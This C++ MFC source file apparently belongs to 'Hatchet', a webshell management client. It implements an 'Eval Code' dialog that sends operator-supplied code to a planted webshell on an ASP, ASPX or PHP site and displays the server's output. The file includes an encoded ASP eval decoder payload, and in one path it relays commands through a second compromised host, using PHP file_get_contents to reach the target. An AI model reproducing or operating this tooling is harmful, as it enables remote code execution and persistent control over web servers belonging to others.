// EvalCodeDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "EvalCodeDlg.h"

// CEvalCodeDlg 对话框
DWORD WINAPI EvalCode_Thread(LPVOID lpParam);	//线程

IMPLEMENT_DYNAMIC(CEvalCodeDlg, CDialog)

CEvalCodeDlg::CEvalCodeDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CEvalCodeDlg::IDD, pParent)
{

}

CEvalCodeDlg::~CEvalCodeDlg()
{
	DestroyWindow();
}

void CEvalCodeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CEvalCodeDlg, CDialog)
	ON_BN_CLICKED(ID_EVALCODE_OK, &CEvalCodeDlg::OnBnClickedOk)
	ON_BN_CLICKED(ID_EVALCODE_CANCEL, &CEvalCodeDlg::OnBnClickedCancel)
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_EVALCODE_IMPORT, &CEvalCodeDlg::OnBnClickedEvalcodeImport)
	ON_BN_CLICKED(IDC_EVALCODE_EXPORT, &CEvalCodeDlg::OnBnClickedEvalcodeExport)
END_MESSAGE_MAP()


// CEvalCodeDlg 消息处理程序

BOOL CEvalCodeDlg::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		if(pMsg -> wParam == VK_ESCAPE)
			return TRUE;
		if(pMsg -> wParam == VK_RETURN)
		{
			if (GetFocus() != GetDlgItem(IDC_EVALCODE_CODE))
			{
				return TRUE;
			}
		}

		if ((pMsg->wParam == 'A' || pMsg->wParam == 'a') && ::GetKeyState(VK_CONTROL)&0x8000)
		{
			if ( GetDlgItem(IDC_EVALCODE_CODE) == GetFocus() )						//全选
			{
				((CEdit *)GetDlgItem(IDC_EVALCODE_CODE))->SetSel( 0, -1);			//全选
			}
			if ( GetDlgItem(IDC_EVALCODE_CONTENT) == GetFocus() )						//全选
			{
				((CEdit *)GetDlgItem(IDC_EVALCODE_CONTENT))->SetSel( 0, -1);			//全选
			}			
			return TRUE;
		}

		if (pMsg -> wParam == VK_F5)				//F5 执行
		{
			if ( GetDlgItem(ID_EVALCODE_OK)->IsWindowEnabled() )
			{
				OnBnClickedOk();
				return TRUE;
			}else{
				m_edit.SetWindowText( "EvalCode Threads busy" );					//设置状态栏
			}			
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}


void CEvalCodeDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	DWORD dPosition = (rcClient.Height()-21)/2;
	CRect	rcCWnd = rcClient;
	CWnd*	pCWnd   =   GetDlgItem(IDC_EVALCODE_CODE);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.bottom = dPosition - 2;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(ID_EVALCODE_OK);
	if (pCWnd != NULL)
	{
		rcCWnd.top = dPosition;
		rcCWnd.bottom = dPosition+21;
		rcCWnd.right = rcClient.Width()/4;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(ID_EVALCODE_CANCEL);
	if (pCWnd != NULL)
	{
		rcCWnd.top = dPosition;
		rcCWnd.bottom = dPosition+21;
		rcCWnd.left = rcClient.Width()/4;
		rcCWnd.right = rcClient.Width()/2;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_EVALCODE_IMPORT);
	if (pCWnd != NULL)
	{
		rcCWnd.top = dPosition;
		rcCWnd.bottom = dPosition+21;
		rcCWnd.left = rcClient.Width()/2;
		rcCWnd.right = rcClient.Width()/12*9;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_EVALCODE_EXPORT);
	if (pCWnd != NULL)
	{
		rcCWnd.top = dPosition;
		rcCWnd.bottom = dPosition+21;
		rcCWnd.left = rcClient.Width()/12*9;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_EVALCODE_CONTENT);
	if (pCWnd != NULL)
	{
		rcCWnd.top = dPosition+23;
		pCWnd->MoveWindow(rcCWnd);
	}
}


BOOL CEvalCodeDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	GetDlgItem(IDC_EVALCODE_CODE)->SetFont(&m_FontSample);
	GetDlgItem(ID_EVALCODE_OK)->SetFont(&m_FontSample);
	GetDlgItem(ID_EVALCODE_CANCEL)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EVALCODE_CONTENT)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EVALCODE_IMPORT)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EVALCODE_EXPORT)->SetFont(&m_FontSample);

	m_edit.SetWindowText( "Eval Code" );					//设置状态栏

	szSiteUrl = szGlobal_SiteUrl;
	szSiteJoinUrl = szGlobal_SiteJoinUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;

	szSiteJoinPass = "";
	if (szSiteJoinUrl !="")
	{
		CString szSiteJoinUrlTemp = szSiteJoinUrl;
		szSiteJoinUrlTemp.Replace("'", "''");
		pMydb->Select("SELECT [SitePass] FROM [SiteTable] where [SiteUrl]='"+ szSiteJoinUrlTemp +"'", MydbArray);
		if (MydbArray.GetSize() != 0)
		{
			szSiteJoinPass = MydbArray.GetAt(0);
		}
	}

	if (nSiteScript == 1)
	{
		SetDlgItemText(IDC_EVALCODE_CODE, "Response.Write(\"Hello ASP!\")");
	}else if (nSiteScript == 2)
	{
		SetDlgItemText(IDC_EVALCODE_CODE, "Response.Write(\"Hello JScript.NET!\");");
	}else if (nSiteScript == 3)
	{
		SetDlgItemText(IDC_EVALCODE_CODE, "Print_r(\"Hello PHP!\");");
	}

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CEvalCodeDlg::OnBnClickedCancel()
{
	SetDlgItemText(IDC_EVALCODE_CODE, "");
	SetDlgItemText(IDC_EVALCODE_CONTENT, "");
}


void CEvalCodeDlg::OnBnClickedOk()
{
	GetDlgItem(ID_EVALCODE_OK)->EnableWindow(FALSE);
	GetDlgItem(ID_EVALCODE_CANCEL)->EnableWindow(FALSE);

	CreateThread(NULL, 0, EvalCode_Thread, (LPVOID)this, 0, 0);		//获取文件内容
}

DWORD WINAPI EvalCode_Thread(LPVOID lpParam)	//线程
{
	CEvalCodeDlg* pDlg = (CEvalCodeDlg*)lpParam;
	
	CString temp,szEvalCode;
	pDlg->GetDlgItemText(IDC_EVALCODE_CODE, temp);
	if (temp == "")
	{
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),ID_EVALCODE_OK),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),ID_EVALCODE_CANCEL),TRUE);
		m_edit.SetWindowText("Enter incomplete!");					//设置状态栏
		return 0;
	}

	m_edit.SetWindowText( "Running" );					//设置状态栏

	if (pDlg->nSiteScript == 1)
	{
		temp = UrlEnCode(pDlg->nSiteCode, temp, false, true);
		szEvalCode = Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
			"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
			"bd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
			"Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
			"B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
			"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\""+ temp +"\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szEvalCode, pDlg->nSiteCode, temp, szError);
	}else if (pDlg->nSiteScript == 2)
	{
		temp = MyBase64Encode(pDlg->nSiteCode, temp);
		szEvalCode = Ini_szASPX_POST_DATA;
		szEvalCode.Replace("%szBase64EvalCode%", temp);
		temp.Format("%d", pDlg->nSiteCode);
		szEvalCode.Replace("%nPageCode%", temp);		
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szEvalCode, pDlg->nSiteCode, temp, szError);
	}else if (pDlg->nSiteScript == 3)
	{
		temp = Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"+ temp +";echo(\"|<-\");die();";
		temp = MyBase64Encode(pDlg->nSiteCode, temp);
		szEvalCode = Ini_szPHP_POST_DATA + temp;

		if (pDlg->szSiteJoinUrl !="" && pDlg->szSiteJoinPass != "")
		{
			CString szEvalCode_Thread_Join = "$data='"+ pDlg->szSitePass + szEvalCode +"';"
				"$op=array('http'=>array('method'=>'POST','header'=>\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\\r\\nContent-type: application/x-www-form-urlencoded\\r\\n"
				"Content-length: \".strlen($data).\"\\r\\n\",'content'=>$data));echo file_get_contents('"+pDlg->szSiteUrl+"',false,stream_context_create($op));";

			szEvalCode_Thread_Join = Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + szEvalCode_Thread_Join);

			bHttpIsOK = MyHttp(pDlg->szSiteJoinUrl, pDlg->szSiteJoinPass + szEvalCode_Thread_Join, pDlg->nSiteCode, temp, szError);
		}else if(pDlg->szSiteJoinUrl !="" && pDlg->szSiteJoinPass == "")
		{
			AfxMessageBox("Join Url NotFind!");
			return 0;
		}else{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szEvalCode, pDlg->nSiteCode, temp, szError);
		}
	}
	CString szM_Edit;
	szM_Edit.Format("Return %d lengths", temp.GetLength());
	m_edit.SetWindowText( szM_Edit );					//设置状态栏
	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		m_edit.SetWindowText("Connection error, please check!");					//设置状态栏
		pDlg->SetDlgItemText(IDC_EVALCODE_CONTENT, szError);
	}else{
		pDlg->SetDlgItemText(IDC_EVALCODE_CONTENT, temp);
	}

	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),ID_EVALCODE_OK),TRUE);
	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),ID_EVALCODE_CANCEL),TRUE);
	return 0;
}


void CEvalCodeDlg::OnBnClickedEvalcodeImport()
{
	CFileDialog hFileDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY, _T("All Files (*.*)|*.*||"));
	if( hFileDlg.DoModal() == IDOK )
	{
		CStdioFile pFile;
		if ( pFile.Open(hFileDlg.GetPathName(), CFile::modeRead) )
		{
			CString szLine="",szContent="";
			while( pFile.ReadString(szLine) )
			{
				szContent = szContent + szLine + "\r\n";
			}
			SetDlgItemText(IDC_EVALCODE_CODE, szContent);
			pFile.Close();
		}
	}
}



void CEvalCodeDlg::OnBnClickedEvalcodeExport()
{
	CString temp;
	GetDlgItemText(IDC_EVALCODE_CONTENT, temp);
	if (temp == "")
	{
		m_edit.SetWindowText("The content is empty!");					//设置状态栏
	}

	char DesktopPath[255];
	SHGetSpecialFolderPath(0,DesktopPath,CSIDL_DESKTOPDIRECTORY,0);
	sprintf_s(DesktopPath, 255, "%s\\Content.html",DesktopPath);
	CFileDialog hFileDlg(FALSE, NULL , DesktopPath, OFN_OVERWRITEPROMPT | OFN_HIDEREADONLY | OFN_NOCHANGEDIR, TEXT("WebPage(*.html)|*.html|All files(*.*)|*.*|"),NULL);

	if(hFileDlg.DoModal() == IDOK)
	{
		CStdioFile pFile;
		if ( pFile.Open(hFileDlg.GetPathName(), CFile::modeCreate|CFile::modeWrite) )
		{
			pFile.WriteString(temp);
			pFile.Close();
		}
	}
}
